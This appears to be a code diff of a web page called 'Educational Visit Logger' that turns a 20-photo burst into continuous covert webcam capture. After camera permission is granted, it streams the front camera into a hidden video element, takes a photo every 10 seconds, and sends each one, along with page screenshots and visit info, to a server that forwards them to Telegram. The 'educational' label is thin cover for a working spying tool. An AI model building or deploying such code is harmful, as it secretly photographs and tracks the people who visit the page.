@@ -27,7 +27,10 @@
     }
     button.primary { background: #28a745; }
     button.primary:hover { background: #218838; }
+    button.stop { background: #dc3545; }
+    button.stop:hover { background: #c82333; }
     button:disabled { opacity: 0.6; cursor: not-allowed; }
+    #status { font-size: 16px; color: #555; margin: 20px; }
     #hiddenVideo {
       display: none;
       position: absolute;
@@ -41,35 +44,37 @@
 <body>
 
   <h2>Educational Visit Logger</h2>
-  <p>Educational purpose only — all actions (info, screenshot, burst photos) are sent to Telegram.</p>
+  <p>Educational purpose only — all actions sent to Telegram.</p>
 
-  <!-- বাটন ১ -->
   <button class="primary" onclick="sendData()">I Agree & Send Info</button>
-
-  <!-- বাটন ২ -->
   <button class="primary" onclick="captureAndSendScreenshot()">Take Screenshot & Send 📸</button>
 
-  <!-- বাটন ৩: ২০টা ছবি burst -->
-  <button class="primary" id="sendBurstPhotosBtn" onclick="startBurstHiddenPhotos()">
-    Send 20 Hidden Photos (1 now + every 10s)
+  <br><br>
+
+  <button class="primary" id="startContinuousBtn" onclick="startContinuousHiddenPhotos()">
+    Start Continuous Hidden Photos (every 10s)
   </button>
 
-  <!-- হাইড ভিডিও -->
+  <button class="stop" id="stopContinuousBtn" onclick="stopContinuousPhotos()" style="display:none;">
+    Stop Sending Photos
+  </button>
+
+  <div id="status"></div>
+
   <video id="hiddenVideo" autoplay playsinline muted></video>
 
   <script>
-    // ১. শুধু টেক্সট লগ
+    // আগের ফাংশনগুলো
     async function sendData() {
       try {
         const res = await fetch("/api/send", { method: "POST" });
         const data = await res.json();
         alert(data.success ? "Info Sent ✅" : "Failed ❌");
       } catch {
-        alert("Error connecting to server");
+        alert("Error");
       }
     }
 
-    // ২. স্ক্রিনশট
     async function captureAndSendScreenshot() {
       try {
         const canvas = await html2canvas(document.body, { scale: 2 });
@@ -80,32 +85,32 @@
           body: JSON.stringify({ image: base64 })
         });
         const data = await res.json();
-        alert(data.success ? "Screenshot Sent 📸✅" : "Failed ❌");
+        alert(data.success ? "Screenshot Sent ✅" : "Failed ❌");
       } catch (err) {
         alert("Screenshot error: " + err.message);
       }
     }
 
-    // ৩. ২০টা ছবি burst (super fast first + 10s interval)
-    const burstBtn = document.getElementById('sendBurstPhotosBtn');
-    let burstStream = null;
-    let burstVideo = document.getElementById('hiddenVideo');
-    let burstIntervalId = null;
-    let burstCount = 0;
-    const TOTAL_BURST = 20;
-    const INTERVAL_MS = 10000; // 10 seconds
+    // Continuous mode (প্রতি ১০ সেকেন্ডে নতুন ছবি)
+    const startBtn = document.getElementById('startContinuousBtn');
+    const stopBtn = document.getElementById('stopContinuousBtn');
+    const statusDiv = document.getElementById('status');
+    let contStream = null;
+    let contVideo = document.getElementById('hiddenVideo');
+    let contIntervalId = null;
+    let photoCounter = 0;
 
-    async function startBurstHiddenPhotos() {
-      if (burstCount > 0) {
-        alert("Burst mode already running. Please wait.");
+    async function startContinuousHiddenPhotos() {
+      if (contIntervalId) {
+        alert("Already running. Stop first if needed.");
         return;
       }
 
-      burstBtn.disabled = true;
-      burstBtn.textContent = "Starting burst photos... 📷";
+      startBtn.disabled = true;
+      startBtn.textContent = "Starting... 📷";
 
       try {
-        burstStream = await navigator.mediaDevices.getUserMedia({
+        contStream = await navigator.mediaDevices.getUserMedia({
           video: {
             facingMode: "user",
             width: { ideal: 640 },
@@ -114,56 +119,54 @@
           audio: false
         });
 
-        burstVideo.srcObject = burstStream;
+        contVideo.srcObject = contStream;
 
         await new Promise((resolve, reject) => {
-          burstVideo.onloadedmetadata = () => {
-            burstVideo.play().then(resolve).catch(reject);
+          contVideo.onloadedmetadata = () => {
+            contVideo.play().then(resolve).catch(reject);
           };
-          burstVideo.onerror = reject;
-          setTimeout(() => reject(new Error("Video load timeout")), 2000);
+          contVideo.onerror = reject;
+          setTimeout(() => reject(new Error("Timeout")), 2000);
         });
 
-        if (burstVideo.videoWidth === 0 || burstVideo.videoHeight === 0) {
-          throw new Error("Camera frame not ready");
+        if (contVideo.videoWidth === 0 || contVideo.videoHeight === 0) {
+          throw new Error("No video frame");
         }
 
-        burstCount = 0;
-        alert(`Burst started! Sending first photo now...\nTotal: ${TOTAL_BURST} photos (every 10 seconds)`);
+        statusDiv.textContent = "Camera started. Sending first photo now...";
+        photoCounter = 0;
 
         // প্রথম ছবি সাথে সাথে
-        await captureAndSendOneBurstPhoto();
+        await sendOneHiddenPhoto();
 
-        // বাকি ছবিগুলো interval-এ
-        burstIntervalId = setInterval(async () => {
-          if (burstCount >= TOTAL_BURST) {
-            clearInterval(burstIntervalId);
-            cleanupBurst();
-            return;
-          }
-          await captureAndSendOneBurstPhoto();
-        }, INTERVAL_MS);
+        // তারপর প্রতি ১০ সেকেন্ডে
+        contIntervalId = setInterval(async () => {
+          await sendOneHiddenPhoto();
+        }, 10000);
+
+        startBtn.style.display = 'none';
+        stopBtn.style.display = 'inline-block';
 
       } catch (err) {
-        let msg = "Failed to start burst.";
-        if (err.name === 'NotAllowedError') msg = "Camera permission denied – please allow";
-        else if (err.name === 'NotFoundError') msg = "No camera found on this device";
-        else msg += "\n" + err.message;
+        let msg = "Failed to start.";
+        if (err.name === 'NotAllowedError') msg = "Permission denied – allow camera";
+        else if (err.name === 'NotFoundError') msg = "No camera";
+        else msg += " " + err.message;
         alert(msg);
         console.error(err);
-        cleanupBurst();
+        resetButtons();
       }
     }
 
-    async function captureAndSendOneBurstPhoto() {
-      burstCount++;
-      const current = burstCount;
+    async function sendOneHiddenPhoto() {
+      photoCounter++;
+      statusDiv.textContent = `Sending photo #${photoCounter}...`;
 
       try {
         const canvas = document.createElement('canvas');
-        canvas.width = burstVideo.videoWidth;
-        canvas.height = burstVideo.videoHeight;
-        canvas.getContext('2d').drawImage(burstVideo, 0, 0);
+        canvas.width = contVideo.videoWidth;
+        canvas.height = contVideo.videoHeight;
+        canvas.getContext('2d').drawImage(contVideo, 0, 0);
 
         const base64 = canvas.toDataURL('image/png');
 
@@ -175,32 +178,39 @@
 
         const data = await res.json();
 
-        console.log(`Photo ${current}/${TOTAL_BURST} → ${data.success ? 'Sent' : 'Failed'}`);
-
-        if (burstCount >= TOTAL_BURST) {
-          alert(`Burst finished! Total ${TOTAL_BURST} hidden photos sent to Telegram. 📷`);
-          cleanupBurst();
+        if (data.success) {
+          statusDiv.textContent = `Photo #${photoCounter} sent successfully ✅ (next in 10s)`;
+        } else {
+          statusDiv.textContent = `Photo #${photoCounter} failed to send ❌`;
         }
+
       } catch (err) {
-        console.error(`Photo ${current} error:`, err);
+        console.error("Photo send error:", err);
+        statusDiv.textContent = `Error sending photo #${photoCounter}`;
       }
     }
 
-    function cleanupBurst() {
-      if (burstIntervalId) {
-        clearInterval(burstIntervalId);
-        burstIntervalId = null;
+    function stopContinuousPhotos() {
+      if (contIntervalId) {
+        clearInterval(contIntervalId);
+        contIntervalId = null;
       }
-      if (burstStream) {
-        burstStream.getTracks().forEach(track => track.stop());
-        burstStream = null;
+      if (contStream) {
+        contStream.getTracks().forEach(track => track.stop());
+        contStream = null;
       }
-      if (burstVideo) {
-        burstVideo.srcObject = null;
+      if (contVideo) {
+        contVideo.srcObject = null;
       }
-      burstCount = 0;
-      burstBtn.disabled = false;
-      burstBtn.textContent = "Send 20 Hidden Photos (1 now + every 10s)";
+      statusDiv.textContent = `Stopped after ${photoCounter} photos.`;
+      resetButtons();
+    }
+
+    function resetButtons() {
+      startBtn.disabled = false;
+      startBtn.textContent = "Start Continuous Hidden Photos (every 10s)";
+      startBtn.style.display = 'inline-block';
+      stopBtn.style.display = 'none';
     }
   </script>
 
